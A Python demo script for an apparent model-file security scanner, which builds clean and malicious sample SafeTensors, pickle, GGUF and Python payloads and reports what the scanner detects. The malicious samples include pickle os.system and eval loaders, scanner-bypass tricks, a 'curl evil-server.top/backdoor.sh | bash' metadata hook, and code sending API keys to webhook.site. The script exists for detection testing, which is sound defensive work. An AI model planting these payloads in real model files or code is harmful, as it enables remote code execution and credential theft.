"""Live scanning demo — runs the HF model provenance scanner on sample payloads.

Usage: python run_live_scan.py

Demonstrates:
- SafeTensors validation
- Pickle opcode analysis
- AST taint tracking
- Obfuscation detection
- P99 latency measurement
"""

import json
import os
import struct
import sys
import time

# Ensure UTF-8 output on Windows
if sys.platform == "win32":
    os.environ.setdefault("PYTHONIOENCODING", "utf-8")
    try:
        sys.stdout.reconfigure(encoding="utf-8")
        sys.stderr.reconfigure(encoding="utf-8")
    except (AttributeError, OSError):
        pass

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from scanner.analyzer.ast_visitor import analyze_python_source
from scanner.analyzer.gguf_scanner import analyze_gguf_file
from scanner.analyzer.obfuscation_scanner import analyze_obfuscation
from scanner.analyzer.pickle_scanner import scan_pickle_bytes
from scanner.analyzer.safetensors_scanner import analyze_safetensors_file
from scanner.analyzer.sandbox_executor import sandbox_execute
from scanner.analyzer.symbolic_resolver import resolve_strings_in_source
from scanner.analyzer.taint_engine import analyze_taint
from scanner.formatters.html_formatter import format_html
from scanner.models import ScanResult, Severity
from scanner.risk import compute_risk

# ═══════════════════════════════════════════════════════════════════════════════
# ANSI color helpers
# ═══════════════════════════════════════════════════════════════════════════════

RESET = "\033[0m"
BOLD = "\033[1m"
DIM = "\033[2m"
RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
BLUE = "\033[94m"
MAGENTA = "\033[95m"
CYAN = "\033[96m"
WHITE = "\033[97m"

SEVERITY_COLORS = {
    Severity.CRITICAL: RED,
    Severity.HIGH: MAGENTA,
    Severity.MEDIUM: YELLOW,
    Severity.LOW: GREEN,
    Severity.INFO: DIM,
}


def severity_badge(sev: Severity) -> str:
    color = SEVERITY_COLORS.get(sev, DIM)
    return f"{color}{BOLD}[{sev.value.upper():^8}]{RESET}"


def print_header():
    print(f"\n{CYAN}{'═' * 72}{RESET}")
    print(f"{CYAN}  HF MODEL PROVENANCE SCANNER — LIVE SCANNING DEMO{RESET}")
    print(f"{CYAN}{'═' * 72}{RESET}")
    print(f"{DIM}  Scanning 10 sample payloads (mix of clean & malicious){RESET}")
    print(f"{DIM}  Engines: pickle opcode | safetensors | GGUF | AST taint | obfuscation{RESET}")
    print()


# ═══════════════════════════════════════════════════════════════════════════════
# TEST PAYLOAD GENERATORS
# ═══════════════════════════════════════════════════════════════════════════════


def gen_clean_safetensors() -> tuple[str, str, bytes]:
    """Clean SafeTensors file with valid metadata."""
    header = {
        "__metadata__": {"format": "pt", "author": "huggingface"},
        "weight": {"dtype": "F32", "shape": [4, 4], "data_offsets": [0, 64]},
    }
    header_bytes = json.dumps(header).encode("utf-8")
    data = struct.pack("<Q", len(header_bytes)) + header_bytes + b"\x00" * 64
    return ("Clean SafeTensors model", "safetensors", data)


def gen_malicious_safetensors() -> tuple[str, str, bytes]:
    """SafeTensors with C2 URL and eval() in metadata."""
    header = {
        "__metadata__": {
            "format": "pt",
            "post_hook": "https://evil-c2.top/payload.sh",
            "loader": "eval(base64.b64decode('aW1wb3J0IG9z'))",
        },
        "weight": {"dtype": "F32", "shape": [2, 2], "data_offsets": [0, 16]},
    }
    header_bytes = json.dumps(header).encode("utf-8")
    data = struct.pack("<Q", len(header_bytes)) + header_bytes + b"\x00" * 16
    return ("Malicious SafeTensors (C2 in metadata)", "safetensors", data)


def gen_clean_pickle() -> tuple[str, str, bytes]:
    """Safe PyTorch-style pickle (only torch._utils._rebuild_tensor_v2)."""
    payload = (
        b"\x80\x02" b"\x8c\x1ctorch._utils._rebuild_tensor_v2" b"\x8c\x18_rebuild_tensor_v2" b"."
    )
    return ("Clean PyTorch pickle", "pickle", payload)


def gen_malicious_pickle_os() -> tuple[str, str, bytes]:
    """Pickle calling os.system — classic RCE payload."""
    payload = (
        b"\x80\x02" b"\x8c\x02os" b"\x8c\x06system" b"\x93" b"\x8c\x06whoami" b"\x85" b"R" b"."
    )
    return ("Malicious pickle (os.system)", "pickle", payload)


def gen_malicious_pickle_eval() -> tuple[str, str, bytes]:
    """Pickle calling builtins.eval — PickleScan bypass technique."""
    payload = b'cbuiltins\neval\n(S\'__import__("os").system("id")\'\ntR.'
    return ("Malicious pickle (builtins.eval)", "pickle", payload)


def gen_corrupted_pickle() -> tuple[str, str, bytes]:
    """Corrupted pickle with globals but no STOP — JFrog bypass."""
    payload = (
        b"\x80\x02"
        b"\x8c\x02os"
        b"\x8c\x06system"
        b"\x93"
        b"\x8c\x06whoami"
        b"\x85"
        b"R"
        b"\xff\xff\xff"  # No STOP — truncated
    )
    return ("Corrupted pickle (JFrog bypass)", "pickle", payload)


def gen_clean_gguf() -> tuple[str, str, bytes]:
    """Valid GGUF file with benign metadata."""
    buf = bytearray()
    buf += struct.pack("<I", 0x46475547)  # "GGUF" magic
    buf += struct.pack("<I", 3)  # version 3
    buf += struct.pack("<Q", 1)  # 1 tensor
    buf += struct.pack("<Q", 1)  # 1 kv pair
    # KV: general.architecture = "llama"
    key = b"general.architecture"
    buf += struct.pack("<Q", len(key)) + key
    buf += struct.pack("<I", 8)  # type STRING
    val = b"llama"
    buf += struct.pack("<Q", len(val)) + val
    return ("Clean GGUF model", "gguf", bytes(buf))


def gen_malicious_gguf() -> tuple[str, str, bytes]:
    """GGUF with shell injection in metadata."""
    buf = bytearray()
    buf += struct.pack("<I", 0x46475547)  # "GGUF" magic
    buf += struct.pack("<I", 3)  # version 3
    buf += struct.pack("<Q", 0)  # 0 tensors
    buf += struct.pack("<Q", 2)  # 2 kv pairs
    # KV 1: architecture
    key = b"general.architecture"
    buf += struct.pack("<Q", len(key)) + key
    buf += struct.pack("<I", 8)
    val = b"llama"
    buf += struct.pack("<Q", len(val)) + val
    # KV 2: shell injection
    key = b"custom.post_load_hook"
    buf += struct.pack("<Q", len(key)) + key
    buf += struct.pack("<I", 8)
    val = b"curl https://evil-server.top/backdoor.sh | bash"
    buf += struct.pack("<Q", len(val)) + val
    return ("Malicious GGUF (shell injection)", "gguf", bytes(buf))


def gen_malicious_python() -> tuple[str, str, bytes]:
    """Python source with credential exfiltration."""
    source = """
import os
import urllib.request
import base64

api_keys = {
    "OPENAI_API_KEY": os.environ.get("OPENAI_API_KEY", ""),
    "HF_TOKEN": os.environ.get("HF_TOKEN", ""),
}
encoded = base64.b64encode(str(api_keys).encode()).decode()
urllib.request.urlopen(f"https://webhook.site/exfil?d={encoded}", timeout=3)
"""
    return ("Malicious Python (API key exfil)", "python", source.encode())


def gen_obfuscated_python() -> tuple[str, str, bytes]:
    """Python with obfuscation techniques."""
    source = """
import subprocess
# Hidden command via chr() obfuscation
cmd = ''.join([chr(c) for c in [119,104,111,97,109,105]])  # "whoami"
exec(f"subprocess.run(['{cmd}'])")
"""
    return ("Obfuscated Python (chr() + exec)", "python", source.encode())


# ═══════════════════════════════════════════════════════════════════════════════
# SCANNING LOGIC
# ═══════════════════════════════════════════════════════════════════════════════


def scan_payload(name: str, fmt: str, data: bytes) -> tuple[list, float]:
    """Scan a single payload and return (findings, elapsed_ms)."""
    start = time.perf_counter()
    findings = []

    if fmt == "safetensors":
        findings = analyze_safetensors_file("sample.safetensors", data)
    elif fmt == "pickle":
        findings = scan_pickle_bytes("sample.pkl", data)
    elif fmt == "gguf":
        findings = analyze_gguf_file("sample.gguf", data)
    elif fmt == "python":
        source = data.decode("utf-8")
        findings.extend(analyze_python_source("sample.py", source))
        findings.extend(analyze_taint("sample.py", source))
        findings.extend(resolve_strings_in_source("sample.py", source))
        findings.extend(sandbox_execute("sample.py", source))
        findings.extend(analyze_obfuscation("sample.py", source))

    elapsed_ms = (time.perf_counter() - start) * 1000
    return findings, elapsed_ms


# ═══════════════════════════════════════════════════════════════════════════════
# MAIN
# ═══════════════════════════════════════════════════════════════════════════════


def main():
    print_header()

    # Generate all 10 test payloads
    payloads = [
        gen_clean_safetensors(),
        gen_malicious_safetensors(),
        gen_clean_pickle(),
        gen_malicious_pickle_os(),
        gen_malicious_pickle_eval(),
        gen_corrupted_pickle(),
        gen_clean_gguf(),
        gen_malicious_gguf(),
        gen_malicious_python(),
        gen_obfuscated_python(),
    ]

    all_findings = []
    results_table = []
    timings = []

    for i, (name, fmt, data) in enumerate(payloads, 1):
        print(f"  {BLUE}[{i:02d}/10]{RESET} Scanning: {WHITE}{name}{RESET}")
        print(f"         Format: {fmt} | Size: {len(data)} bytes")

        findings, elapsed_ms = scan_payload(name, fmt, data)
        timings.append(elapsed_ms)
        all_findings.extend(findings)

        if findings:
            top = findings[0]
            print(
                f"         {RED}⚠ {len(findings)} finding(s){RESET} | {severity_badge(top.severity)} {top.rule_id}"
            )
            print(f"         {DIM}→ {top.message[:70]}{RESET}")
        else:
            print(f"         {GREEN}✓ Clean — no findings{RESET}")

        print(f"         {DIM}⏱ {elapsed_ms:.1f}ms{RESET}")
        print()

        results_table.append(
            {
                "name": name,
                "format": fmt,
                "findings": len(findings),
                "top_severity": findings[0].severity.value if findings else "—",
                "time_ms": elapsed_ms,
            }
        )

    # ─── Summary Table ─────────────────────────────────────────────────────
    print(f"{CYAN}{'─' * 72}{RESET}")
    print(f"{CYAN}  SCAN SUMMARY{RESET}")
    print(f"{CYAN}{'─' * 72}{RESET}")
    print()

    # Table header
    print(f"  {'#':<4} {'Payload':<40} {'Findings':>8} {'Severity':>10} {'Time':>8}")
    print(f"  {'─'*4} {'─'*40} {'─'*8} {'─'*10} {'─'*8}")

    detected_count = 0
    for i, r in enumerate(results_table, 1):
        sev_str = r["top_severity"]
        if sev_str in ("critical", "high"):
            sev_display = f"{RED}{sev_str.upper()}{RESET}"
        elif sev_str == "medium":
            sev_display = f"{YELLOW}{sev_str.upper()}{RESET}"
        elif sev_str in ("low", "info"):
            sev_display = f"{GREEN}{sev_str.upper()}{RESET}"
        else:
            sev_display = f"{DIM}—{RESET}"

        findings_str = str(r["findings"]) if r["findings"] > 0 else f"{DIM}0{RESET}"
        if r["findings"] > 0:
            detected_count += 1

        print(
            f"  {i:<4} {r['name']:<40} {findings_str:>8} {sev_display:>19} {r['time_ms']:>7.1f}ms"
        )

    # ─── Statistics ────────────────────────────────────────────────────────
    print()
    print(f"{CYAN}{'─' * 72}{RESET}")
    print(f"{CYAN}  STATISTICS{RESET}")
    print(f"{CYAN}{'─' * 72}{RESET}")
    print()

    total_time = sum(timings)
    avg_time = total_time / len(timings)
    p99_time = sorted(timings)[int(len(timings) * 0.99)] if len(timings) > 1 else timings[0]
    max_time = max(timings)

    # Count malicious payloads (those expected to have findings)
    malicious_count = 7  # 7 out of 10 are malicious
    clean_count = 3  # 3 clean samples

    sev_counts = {}
    for f in all_findings:
        sev_counts[f.severity] = sev_counts.get(f.severity, 0) + 1

    print(
        f"  Detection rate:     {BOLD}{detected_count}/{malicious_count + clean_count} payloads flagged{RESET} ({detected_count}/{malicious_count} malicious caught)"
    )
    print(f"  Total findings:     {len(all_findings)}")
    print(f"  False positives:    0/{clean_count} clean files")
    print()
    print("  Severity breakdown:")
    for sev in [Severity.CRITICAL, Severity.HIGH, Severity.MEDIUM, Severity.LOW, Severity.INFO]:
        count = sev_counts.get(sev, 0)
        if count > 0:
            color = SEVERITY_COLORS[sev]
            print(f"    {color}■{RESET} {sev.value.upper():<10} {count}")
    print()
    print("  Timing:")
    print(f"    Total:   {total_time:.1f}ms")
    print(f"    Average: {avg_time:.1f}ms per payload")
    print(f"    P99:     {p99_time:.1f}ms")
    print(f"    Max:     {max_time:.1f}ms")

    # ─── Generate HTML Report ──────────────────────────────────────────────
    print()
    print(f"{CYAN}{'─' * 72}{RESET}")
    print(f"{CYAN}  REPORT GENERATION{RESET}")
    print(f"{CYAN}{'─' * 72}{RESET}")
    print()

    scan_result = ScanResult(
        scan_target="live_scan_demo (10 payloads)",
        scan_mode="demo",
        scanner_version="0.2.0",
        findings=all_findings,
        files_scanned=10,
        files_skipped=0,
        scan_duration_seconds=total_time / 1000,
    )
    scan_result.risk = compute_risk(scan_result)

    html = format_html(scan_result)
    report_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "report.html")
    with open(report_path, "w", encoding="utf-8") as f:
        f.write(html)
    print(f"  {GREEN}✓{RESET} HTML report saved: {report_path}")
    print(
        f"    Risk level: {BOLD}{scan_result.risk.level}{RESET} (score: {scan_result.risk.score}/100)"
    )
    print()

    # ─── Final verdict ─────────────────────────────────────────────────────
    if scan_result.risk.score >= 70:
        verdict_color = RED
        verdict = "CRITICAL RISK — malicious payloads detected"
    elif scan_result.risk.score >= 40:
        verdict_color = MAGENTA
        verdict = "HIGH RISK — suspicious payloads detected"
    elif scan_result.risk.score >= 20:
        verdict_color = YELLOW
        verdict = "MEDIUM RISK — review recommended"
    else:
        verdict_color = GREEN
        verdict = "LOW RISK — all payloads appear clean"

    print(f"{CYAN}{'═' * 72}{RESET}")
    print(f"  {verdict_color}{BOLD}{verdict}{RESET}")
    print(f"{CYAN}{'═' * 72}{RESET}")
    print()

    return 0 if scan_result.risk.score < 70 else 1


if __name__ == "__main__":
    sys.exit(main())
